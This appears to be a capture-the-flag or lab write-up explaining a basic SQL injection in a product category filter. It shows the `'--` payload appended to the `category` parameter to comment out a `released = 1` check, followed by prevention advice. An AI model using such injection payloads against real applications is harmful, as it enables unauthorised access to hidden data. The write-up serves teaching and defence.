# SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

## Objective
Exploit a SQL injection vulnerability in the product category filter to display unreleased products.

## Vulnerable Parameter
`category`

## Original Request
```http
GET /filter?category=Corporate+gifts HTTP/2
```

## Payload Used
```sql
'--
```

## Modified Request
```http
GET /filter?category=Corporate+gifts'-- HTTP/2
```

## Explanation
The application executed a query similar to:

```sql
SELECT * FROM products WHERE category = 'Corporate gifts' AND released = 1
```

The payload closed the string and used the SQL comment operator `--` to ignore the remainder of the query.

Resulting query:

```sql
SELECT * FROM products WHERE category = 'Corporate gifts'--' AND released = 1
```

This removed the condition:

```sql
AND released = 1
```

As a result, unreleased products were displayed.

## Prevention
- Use parameterized queries / prepared statements.
- Avoid dynamically concatenating user input into SQL queries.
- Apply proper input validation.
